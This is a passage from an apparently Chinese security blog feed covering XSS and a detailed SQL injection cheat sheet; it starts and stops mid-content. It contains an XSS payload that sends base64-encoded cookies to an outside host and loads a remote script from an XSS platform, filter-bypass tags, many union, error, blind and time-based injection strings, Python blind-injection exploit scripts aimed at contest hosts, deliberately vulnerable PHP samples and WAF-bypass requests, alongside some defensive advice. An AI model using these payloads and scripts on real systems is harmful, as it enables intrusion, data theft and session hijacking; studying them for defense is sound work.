http://127.0.0.1/dom.php?url=javascript:alert(/xss/)</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> url_search=<span class="built_in">document</span>.location.search;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> the_url = <span class="keyword">new</span> URLSearchParams(url_search).get(<span class="string">'url'</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> markup=<span class="string">'&lt;a href="'</span>+the_url+<span class="string">'"&gt;Link&lt;/a&gt;'</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(markup);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/xss-XSS类型、利用和防御/1550131058571.png" alt="1550131058571"></p><p>出现场景：</p><ul><li>在前端实现页面跳转（location.href=’javascript:alert(1)’）</li><li>取值写入页面或动态执行 <ul><li>div.innerHTML=payload</li><li>eval(payload)</li></ul></li><li>使用HTML5 postMessage进行跨域通讯 </li></ul><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>发送cookie：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/reflect.php?xss=&lt;script&gt;fetch(&apos;http://127.0.0.2:8888/&apos;.concat(window.btoa(document.cookie)))&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>使用XSSPT平台：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/reflect.php?xss=%3Cscript%20src=https://xsspt.com/v5Ia54%3E%3C/script%3E</span><br></pre></td></tr></table></figure></p><h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><ol><li><p>使用input/img/svg等标签和onerror/onload/onfocus等属性绕过关键词:</p><ul><li><code>&lt;input autofocus id=a name=&quot;javascript:123&quot; onfocus=&quot;alert(1)&quot;&gt;</code></li><li><code>&lt;img/src/onerror=alert(1)&gt;</code></li><li><code>&lt;svg/onload=alert(1)&gt;</code></li><li><code>&lt;video/src/onerror=alert(1)&gt;</code></li><li><code>&lt;video/src/onloadstart=alert(1)&gt;</code></li><li><code>&lt;details/open/ontoggle=alert(1)&gt;</code></li></ul></li><li><p>使用concat绕过黑名单单词：</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'javascri'</span>.concat(<span class="string">'pt:aler'</span>,<span class="string">'t(1)'</span>)</span><br></pre></td></tr></table></figure></li><li><p>使用<code>+</code>绕过空格</p></li><li><p>二次编码</p></li></ol><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>开启Cookie的HttpOnly选项</p><h2 id="反射型-1"><a href="#反射型-1" class="headerlink" title="反射型"></a>反射型</h2><ul><li><p>（默认选项）添加浏览器保护头部<code>x-xss-protection: 1</code></p></li><li><p>渲染至页面时进行htmlencode</p><p><code>htmlspecialchars(&#39;&lt;script&gt;&#39;) =&gt; &amp;lt;script&amp;gt;</code></p></li></ul><h2 id="存储型-1"><a href="#存储型-1" class="headerlink" title="存储型"></a>存储型</h2><p>渲染至页面时进行htmlencode</p><h2 id="DOM型-1"><a href="#DOM型-1" class="headerlink" title="DOM型"></a>DOM型</h2><p>在js中进行<code>encodeURI</code>过滤，对于标签中的属性（如示例中的href）使用正则过滤。</p><h2 id="样例"><a href="#样例" class="headerlink" title="样例"></a>样例</h2><p>至少过滤如下符号：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">escapeHTML(t)&#123;</span><br><span class="line">    <span class="keyword">return</span> t.replace(<span class="regexp">/&amp;/g</span>,<span class="string">"&amp;amp;"</span>)</span><br><span class="line">        .replace(<span class="regexp">/&lt;/g</span>,<span class="string">"&amp;lt;"</span>)</span><br><span class="line">        .replace(<span class="regexp">/&gt;/g</span>,<span class="string">"&amp;gt;"</span>)</span><br><span class="line">        .replace(<span class="regexp">/ /g</span>,<span class="string">"&amp;nbsp;"</span>)</span><br><span class="line">        .replace(<span class="regexp">/"/g</span>,<span class="string">"&amp;#34;"</span>)</span><br><span class="line">        .replace(<span class="regexp">/'/g</span>,<span class="string">"&amp;#39;"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>驱散前端安全梦魇——DOMXSS典型场景分析与修复指南，<a href="https://security.tencent.com/index.php/blog/msg/107" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/107</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全-XSS </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入总结</title>
      <link href="/sqli-SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
      <url>/sqli-SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h1><h2 id="Union-Based"><a href="#Union-Based" class="headerlink" title="Union Based"></a>Union Based</h2><p>最基本的注入类型，以MySQL为例，假设有注入点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `test` </span><br><span class="line">WHERE `username`=&apos;admin&apos; and `password`=&apos;*&apos;;</span><br></pre></td></tr></table></figure><h3 id="0x01-判断注入点"><a href="#0x01-判断注入点" class="headerlink" title="0x01 判断注入点"></a>0x01 判断注入点</h3><a id="more"></a><p>若原先能够查询到数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and &apos;1&apos;=&apos;1&apos;%23    #有数据</span><br><span class="line">admin&apos; and &apos;1&apos;=&apos;2&apos;%23    #无数据</span><br></pre></td></tr></table></figure><p>若原先查询不到数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; or &apos;1&apos;=&apos;1&apos;%23    #有数据</span><br><span class="line">admin&apos; or &apos;1&apos;=&apos;2&apos;%23    #无数据</span><br></pre></td></tr></table></figure><p>若为整数型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">7 &amp;&amp; 1=2 %23</span><br><span class="line">7 &amp;&amp; 1=1 %23</span><br><span class="line">7 || 1=2 %23</span><br><span class="line">7 || 1=2 %23</span><br></pre></td></tr></table></figure><h3 id="0x02-查询共有多少字段"><a href="#0x02-查询共有多少字段" class="headerlink" title="0x02 查询共有多少字段"></a>0x02 查询共有多少字段</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1%23 </span><br><span class="line">a&apos; UNION SELECT 1,2%23</span><br><span class="line">a&apos; UNION SELECT 1,2,3%23</span><br></pre></td></tr></table></figure><p>…直到正常显示数据为止，或者：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&apos; ORDER BY 1%23</span><br><span class="line">a&apos; ORDER BY 2%23</span><br><span class="line">a&apos; ORDER BY 3%23</span><br></pre></td></tr></table></figure><p>…直到网页报错为止。</p><h3 id="0x03-查询库"><a href="#0x03-查询库" class="headerlink" title="0x03 查询库"></a>0x03 查询库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; union select SCHEMA_NAME,2,3,4,5 from information_schema.SCHEMATA %23</span><br></pre></td></tr></table></figure><h3 id="0x04-查询表"><a href="#0x04-查询表" class="headerlink" title="0x04 查询表"></a>0x04 查询表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&apos; union select TABLE_NAME,2,3,4,5 from information_schema.TABLES where TABLE_SCHEMA=&apos;test&apos; limit 0,1 %23 #第一个表</span><br><span class="line">a&apos; union select TABLE_NAME,2,3,4,5 from information_schema.TABLES where TABLE_SCHEMA=&apos;test&apos; limit 1,1 %23 #第二个表</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="0x05-查询字段"><a href="#0x05-查询字段" class="headerlink" title="0x05 查询字段"></a>0x05 查询字段</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&apos; union select COLUMN_NAME,2,3,4,5 from information_schema.COLUMNS where TABLE_NAME=&apos;test&apos; limit 0,1 %23 #第一个字段</span><br><span class="line">a&apos; union select COLUMN_NAME,2,3,4,5 from information_schema.COLUMNS where TABLE_NAME=&apos;test&apos; limit 0,1 %23 #第二个字段</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="0x05-查询记录"><a href="#0x05-查询记录" class="headerlink" title="0x05 查询记录"></a>0x05 查询记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; union select username,2,3,4,5 from test.test %23</span><br></pre></td></tr></table></figure><h3 id="关于注释"><a href="#关于注释" class="headerlink" title="关于注释"></a>关于注释</h3><ul><li><code>#</code>可以换成<code>%23</code></li><li><code>--+</code></li></ul><h2 id="Error-Based"><a href="#Error-Based" class="headerlink" title="Error Based"></a>Error Based</h2><p>若有错误回显的情况下可以使用mysql的一些函数，引发错误，mysql报错时会将函数参数的值返回，如：</p><p><img src="/sqli-SQL注入总结/1549959620738.png" alt="1549959620738"></p><p>常用的报错函数有：</p><ul><li><p>updatexml()<br><code>updatexml(1,concat(0x7e,(select @@version),0x7e),1)</code></p></li><li><p>extractvalue()<br><code>extractvalue(1,concat(0x7e,version(),0x7e))</code></p></li><li><p>floor()<br><code>(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></p></li><li><p>geometrycollection() 、multipoint() 、polygon()、multipolygon()、linestring()、multilinestring() #5.5以上不适用</p><p><code>geometrycollection((select * from(select * from(select user())a)b))</code></p></li><li><p>exp() #5.5以上不适用</p><p><code>exp(~(select * from(select user())a));</code></p></li></ul><h2 id="Bool-Time-Based-（Blind-Based）"><a href="#Bool-Time-Based-（Blind-Based）" class="headerlink" title="Bool/Time Based （Blind Based）"></a>Bool/Time Based （Blind Based）</h2><h3 id="Bool-Based"><a href="#Bool-Based" class="headerlink" title="Bool Based"></a>Bool Based</h3><p>若原先能够/不能查询到数据，那么若猜测字段正确，那么现在能够/不能查询数据。</p><p>若原先能够查询到数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*&apos; and length((database()))&lt;8#</span><br><span class="line">*&apos; and ascii(substring((database()),1,1))=100# 猜测字段</span><br></pre></td></tr></table></figure><p>若原先不能查询数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*&apos; or length((database()))&lt;8#</span><br><span class="line">*&apos; or ascii(substring((database()),1,1))=100# 猜测字段</span><br></pre></td></tr></table></figure><p>给出exp模板：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=UTF-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">result = <span class="string">''</span></span><br><span class="line">url = <span class="string">'http://a3edf37f0d9741c6ad151c8bafbcad60fc11a19cf7f747a9.game.ichunqiu.com/index.php?'</span></span><br><span class="line">payload = <span class="string">'id=0 or if((ascii(substr((&#123;sql&#125;),&#123;list&#125;,1))&lt;&#123;num&#125;),1,0)'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">        <span class="comment">#hh = payload.format(sql='select database()',list=str(i),num=str(j))</span></span><br><span class="line">        <span class="comment">#hh = payload.format(sql='select count(*) from information_schema.tables',list=str(i),num=str(j))</span></span><br><span class="line">        <span class="comment">#hh = payload.format(sql='select table_name from information_schema.tables limit 81,1',list=str(i),num=str(j))</span></span><br><span class="line">        hh = payload.format(sql=<span class="string">'select * from words.f14g'</span>,list=str(i),num=str(j))</span><br><span class="line">        <span class="comment">#print hh</span></span><br><span class="line">        zz = requests.get(url+hh)</span><br><span class="line">        <span class="comment">#print zz.content</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Hello Hacker!!'</span> <span class="keyword">in</span> zz.content:</span><br><span class="line">            result += chr(j<span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">print</span> result</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="Time-Based"><a href="#Time-Based" class="headerlink" title="Time Based"></a>Time Based</h3><p>那么若猜测字段正确，那么现在延迟一段时间后再返回。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*&apos; or if(ascii(substring((database()),1,1))=116, sleep(100), 1);</span><br></pre></td></tr></table></figure><p>给出exp模板：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">'0123456789abcdef'</span>:</span><br><span class="line">        url = <span class="string">'http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and if((ascii(substr((select flag from flag limit 0,1),'</span>+str(i)+<span class="string">',1))='</span>+str(ord(j))+<span class="string">'),sleep(3),0)--'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url=url,timeout=<span class="number">2.5</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="其他用到的函数-关键字"><a href="#其他用到的函数-关键字" class="headerlink" title="其他用到的函数/关键字"></a>其他用到的函数/关键字</h3><ul><li><p>regexp binary </p><p><code>and password regexp binary ‘^A’#</code></p></li><li><p>mid() 同substr</p><p><code>MID(version(),1,1)</code></p></li><li><p>ord() 同ascii</p></li></ul><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>使用<code>;</code>结束上一句查询语句后再执行另一条语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM test;select if(1=1,SLEEP(100),1);</span><br></pre></td></tr></table></figure><h1 id="非where的注入点"><a href="#非where的注入点" class="headerlink" title="非where的注入点"></a>非where的注入点</h1><h2 id="order-by注入点"><a href="#order-by注入点" class="headerlink" title="order by注入点"></a>order by注入点</h2><ul><li><p>Error Based</p><p><code>order by 1 and(updatexml(1,concat(0x7e,@@version,0x7e),0))</code></p></li><li><p>Time Based #5.5复现失败</p><p><code>order by if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test))</code></p></li><li><p>Bool Based</p><p><code>order by (select+1+regexp+if(substring(user(),1,1)=0x72,1,0x00))</code> </p></li></ul><h2 id="limit注入点"><a href="#limit注入点" class="headerlink" title="limit注入点"></a>limit注入点</h2><ul><li><code>limit 1,1 procedure analyse(extractvalue(1,concat(0x7e,version(),0x7e)),1)</code></li></ul><h2 id="group-by注入点"><a href="#group-by注入点" class="headerlink" title="group by注入点"></a>group by注入点</h2><p><code>GROUP BY if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test));</code></p><h2 id="table注入点"><a href="#table注入点" class="headerlink" title="table注入点"></a>table注入点</h2><p><code>users where updatexml(1, concat(0x7e, (select user()), 0x7e), 1)#</code></p><h2 id="desc注入点"><a href="#desc注入点" class="headerlink" title="desc注入点"></a>desc注入点</h2><p>desc不完全可控和table结合，需要保证desc成功，table报错，只有在desc和table只能有一个含”&#96;”时能注入（都含有或都不含有则无解）<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"xiaoyu"</span>);</span><br><span class="line">mysql_query(<span class="string">"use b2cshop"</span>);</span><br><span class="line">$table = $_GET[<span class="string">'table'</span>];</span><br><span class="line">mysql_query(<span class="string">"desc `shop_&#123;$table&#125;`"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"DESC 出错:"</span>.mysql_error()); <span class="comment">//表名不完全可控</span></span><br><span class="line">$sql = <span class="string">"select * from shop_&#123;$table&#125; where 1=1"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line">var_dump(mysql_fetch_array(mysql_query(<span class="string">"$sql"</span>)));</span><br><span class="line"><span class="keyword">echo</span> mysql_error();</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?table=users` `where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)#</span><br><span class="line"></span><br><span class="line">desc `shop_users` `where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)#`</span><br></pre></td></tr></table></figure><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>即使输入时使用了addslashes进行了过滤，但是MySQL的客户端字符集（character_set_client）设置为GBK、BIG5或其他，导致<code>/</code>在解码时被跳脱，例如有如下程序：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"gbk"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name=$_GET[<span class="string">'name'</span>];</span><br><span class="line">$name=addslashes($name); <span class="comment">//name被转义</span></span><br><span class="line"></span><br><span class="line">$conn=mysql_connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>);</span><br><span class="line">mysql_select_db(<span class="string">"test"</span>,$conn);</span><br><span class="line">$result=mysql_query(<span class="string">"SET NAMES 'GBK'"</span>);</span><br><span class="line">$sql=<span class="string">"select * from test where username='"</span>.$name.<span class="string">"'"</span>;</span><br><span class="line">$result=mysql_query($sql,$conn);</span><br><span class="line"><span class="keyword">if</span>($result)&#123;</span><br><span class="line">    <span class="keyword">while</span> ($row = mysql_fetch_assoc($result)) &#123;</span><br><span class="line">        print_r($row);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Error"</span>.mysql_error().<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload为<code>?name=admin%df%27%20union%20select%201,2%20%23</code></p><p>编码过程<br><code>1&#39; ==addslashes==&gt; 1\&#39; (1\x5c\x27)</code><br><code>1%df&#39; ==addslashes==&gt; 1%df\&#39;(1\xdf\x5c\x27) ==encode(gbk)==&gt; 1運&#39;</code>     #<code>&#39;</code>逃逸</p><h2 id="iconv转换情况"><a href="#iconv转换情况" class="headerlink" title="iconv转换情况"></a>iconv转换情况</h2><p>gbk编码转换成utf8时，转换时也会引发错误：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"gbk"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn=mysql_connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>);</span><br><span class="line">mysql_select_db(<span class="string">"test"</span>,$conn);</span><br><span class="line"></span><br><span class="line">$name=$_GET[<span class="string">'name'</span>];</span><br><span class="line">mysql_query(<span class="string">"set names UTF-8"</span>) ;</span><br><span class="line">$bar =iconv(<span class="string">"GBK"</span>,<span class="string">"UTF-8"</span>, addslashes($name));</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"select * from test where username='"</span>.$name.<span class="string">"'"</span>;</span><br><span class="line">$result=mysql_query($sql,$conn);</span><br><span class="line"><span class="keyword">if</span>($result)&#123;</span><br><span class="line">    <span class="keyword">while</span> ($row = mysql_fetch_assoc($result)) &#123;</span><br><span class="line">        print_r($row);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Error"</span>.mysql_error().<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>payload为<code>admin%e5%5c%27%20union%20select%201,2%20%23</code>(<code>admin%e5\&#39; union select 1,2 #</code>)</p><p>编码过程（由于<code>\xe5\x5c</code>转为UTF-8为<code>\xe9\x8c\xa6</code>）：</p><p><code>%e5\&#39; (\xe5\x5c\x27) ==addslashes==&gt; %e5\\\&#39; (\xe5\x5c\x5c\x5c\x27) ==iconv==&gt; \xe9\x8c\xa6\x5c\x5c\x27</code></p><p>另外，若编码为BIG5时，payload为<code>1兝\&#39; =&gt; 1\xa2\x5c\x5c\x27 =&gt; 1?\\&#39;</code>。</p><h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><ul><li><p>换用utf8字符集</p></li><li><p>使用mysql_set_charset()设置字符集并且使用mysql_real_escape_string()转义，其会考虑当前字符集所以不会产生逃逸问题：</p><p><code>mysql_set_charset(&#39;gbk&#39;);$name=mysql_real_escape_string($name);</code></p></li></ul><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="绕过字符"><a href="#绕过字符" class="headerlink" title="绕过字符"></a>绕过字符</h2><ul><li><p>绕过空格</p><ul><li>%0a(<code>\r</code>)、%0b(<code>\t</code>)、%a0(+)</li></ul></li><li><p>绕过单引号</p><ul><li>编码：Unicode（IIS支持）、Hex</li><li>函数：char</li><li>宽字节</li><li>数字型</li></ul></li><li><p>绕过union</p><ul><li>使用盲注</li></ul></li><li><p>绕过and/or</p><ul><li>&amp;&amp; / ||</li></ul></li><li><p>substring()</p><ul><li>mid() left() right()</li></ul></li><li><p>绕过小括号</p><ul><li><code>?username=admin&#39; and password binary regexp &#39;^A&#39;</code></li></ul></li></ul><h2 id="绕过ngx-lua-waf"><a href="#绕过ngx-lua-waf" class="headerlink" title="绕过ngx_lua_waf"></a>绕过ngx_lua_waf</h2><p>详细请参考<a href="https://www.t00ls.net/articles-45736.html" target="_blank" rel="noopener">Bypass ngx_lua_waf SQL注入防御（多姿势）</a></p><h3 id="HTTP-参数污染（HPP）"><a href="#HTTP-参数污染（HPP）" class="headerlink" title="HTTP 参数污染（HPP）"></a>HTTP 参数污染（HPP）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.8.147/test/sql.aspx</span><br><span class="line">?id=1 UNION/&amp;ID=/SELECT null,name,null/&amp;Id=/FROM master.dbo.sysdatabases</span><br></pre></td></tr></table></figure><h3 id="URI参数溢出"><a href="#URI参数溢出" class="headerlink" title="URI参数溢出"></a>URI参数溢出</h3><p>提交100个以上参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.204.128/test.php</span><br><span class="line"></span><br><span class="line">POST：id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp; id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1 union select 1,2,schema_name %0a/*!from*/information_schema.SCHEMATA</span><br></pre></td></tr></table></figure></p><p>MSSQL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.204.128/test.aspx</span><br><span class="line"></span><br><span class="line">POST：id=1/*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&